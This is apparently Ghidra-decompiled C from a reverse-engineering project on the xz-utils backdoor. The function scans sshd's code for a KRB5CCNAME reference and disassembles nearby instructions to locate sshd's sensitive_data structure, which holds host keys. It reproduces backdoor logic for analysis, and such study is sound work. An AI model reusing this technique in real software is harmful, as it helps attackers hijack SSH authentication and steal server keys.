// /home/kali/xzre-ghidra/xzregh/103340_sshd_get_sensitive_data_address_via_krb5ccname.c
// Function: sshd_get_sensitive_data_address_via_krb5ccname @ 0x103340
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_get_sensitive_data_address_via_krb5ccname(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, void * * sensitive_data_out, elf_info_t * elf)


BOOL sshd_get_sensitive_data_address_via_krb5ccname
               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,void **sensitive_data_out,
               elf_info_t *elf)

{
  undefined1 uVar1;
  BOOL BVar2;
  u8 *code_start_00;
  u8 *puVar3;
  uint uVar4;
  long lVar5;
  byte bVar6;
  u8 *puVar7;
  u8 *puVar8;
  undefined4 *puVar9;
  u8 **ppuVar10;
  undefined1 uVar11;
  byte bVar12;
  undefined1 local_d8 [88];
  u8 *local_80;
  u64 local_78;
  _union_75 local_70;
  byte local_60;
  int local_58;
  long local_50;
  
  bVar12 = 0;
  puVar9 = (undefined4 *)local_d8;
  for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
    *puVar9 = 0;
    puVar9 = puVar9 + 1;
  }
  *sensitive_data_out = (void *)0x0;
  code_start_00 = elf_find_string_reference(elf,STR_KRB5CCNAME,code_start,code_end);
  if (code_start_00 != (u8 *)0x0) {
    while (code_start_00 < code_end) {
      BVar2 = x86_dasm((dasm_ctx_t *)local_d8,code_start_00,code_end);
      if (BVar2 == 0) {
        code_start_00 = code_start_00 + 1;
      }
      else {
        if ((local_d8._40_4_ & 0xfffffffd) == 0xb1) {
          if (local_d8[0x1d] == '\x03') {
            if (((local_d8._16_2_ & 0x20) == 0) || ((local_d8[0x1b] & 8) == 0)) {
              uVar1 = local_d8[0x10] & 0x40;
              if ((local_d8._16_2_ & 0x1040) == 0) {
                if ((local_d8._16_2_ & 0x40) != 0) {
                  uVar11 = 0;
                  uVar1 = local_d8[0x1f];
                  if ((local_d8._16_2_ & 0x20) != 0) {
LAB_00103450:
                    uVar1 = local_d8[0x1f] | (local_d8[0x1b] & 1) << 3;
                  }
                  goto LAB_0010345d;
                }
                uVar11 = 0;
              }
              else {
                if ((local_d8._16_2_ & 0x40) == 0) {
                  uVar11 = local_d8[0x11] & 0x10;
                  if ((local_d8._16_2_ & 0x1000) == 0) goto LAB_0010346b;
                  uVar11 = local_d8[0x20];
                  if ((local_d8._16_2_ & 0x20) != 0) {
                    uVar11 = local_d8[0x20] | (local_d8[0x1b] & 1) << 3;
                  }
                }
                else {
                  uVar11 = local_d8[0x1e];
                  uVar1 = local_d8[0x1f];
                  if ((local_d8._16_2_ & 0x20) != 0) {
                    uVar11 = local_d8[0x1e] | local_d8[0x1b] * '\x02' & 8U;
                    goto LAB_00103450;
                  }
                }
LAB_0010345d:
                if (uVar1 != uVar11) goto LAB_001033d1;
              }
LAB_0010346b:
              ppuVar10 = &local_80;
              for (lVar5 = 0x16; lVar5 != 0; lVar5 = lVar5 + -1) {
                *(undefined4 *)ppuVar10 = 0;
                ppuVar10 = (u8 **)((long)ppuVar10 + (ulong)bVar12 * -8 + 4);
              }
              puVar8 = (u8 *)(local_d8._0_8_ + local_d8._8_8_);
              uVar4 = 0;
              while (((puVar8 < code_end && (uVar4 < 6)) &&
                     (BVar2 = x86_dasm((dasm_ctx_t *)&local_80,puVar8,code_end), BVar2 != 0))) {
                if (local_58 == 0x109) {
                  if (((uint)local_70.field0.field11_0xc & 0xff00ff00) == 0x5000000) {
                    uVar1 = 0;
                    if ((local_70.flags_u16 & 0x1040) != 0) {
                      if ((local_70.flags_u16 & 0x40) == 0) {
                        uVar1 = local_70.field0.flags2 & 0x10;
                        if (((local_70.flags_u16 & 0x1000) != 0) &&
                           (uVar1 = local_60, (local_70.flags_u16 & 0x20) != 0)) {
                          bVar6 = (char)local_70.field0.field10_0xb << 3;
                          goto LAB_00103553;
                        }
                      }
                      else {
                        uVar1 = local_70._14_1_;
                        if ((local_70.flags_u16 & 0x20) != 0) {
                          bVar6 = (char)local_70.field0.field10_0xb * '\x02';
LAB_00103553:
                          uVar1 = uVar1 | bVar6 & 8;
                        }
                      }
                    }
                    if (uVar1 == uVar11) {
                      puVar3 = (u8 *)0x0;
                      if ((local_70.flags_u16 & 0x100) != 0) {
                        puVar3 = local_80 + local_78 + local_50;
                      }
                      puVar7 = puVar3 + -0x18;
                      if ((data_start <= puVar7 && puVar3 != (u8 *)0x18) && (puVar3 + 4 <= data_end)
                         ) goto LAB_0010365f;
                    }
                  }
                }
                else if (local_58 == 0xa5fe) break;
                puVar8 = puVar8 + local_78;
                uVar4 = uVar4 + 1;
              }
            }
          }
        }
        else if (local_d8._40_4_ == 0x147) {
          if (((((local_d8[0x1b] & 8) == 0) && ((uint)local_d8._28_4_ >> 8 == 0x50000)) &&
              ((local_d8._16_2_ & 0x800) != 0)) && (local_d8._64_8_ == 0)) {
            puVar8 = (u8 *)0x0;
            if ((local_d8._16_2_ & 0x100) != 0) {
              puVar8 = (u8 *)(local_d8._0_8_ + local_d8._8_8_ + local_d8._48_8_);
            }
            puVar7 = puVar8 + -0x18;
            if (((puVar8 + 4 <= data_end) && (data_start <= puVar7)) && (puVar7 != (u8 *)0x0)) {
LAB_0010365f:
              *sensitive_data_out = puVar7;
              return 1;
            }
          }
        }
        else if ((local_d8._40_4_ == 0xa5fe) && (code_start != (u8 *)local_d8._0_8_)) {
          return 0;
        }
LAB_001033d1:
        code_start_00 = code_start_00 + local_d8._8_8_;
      }
    }
  }
  return 0;
}

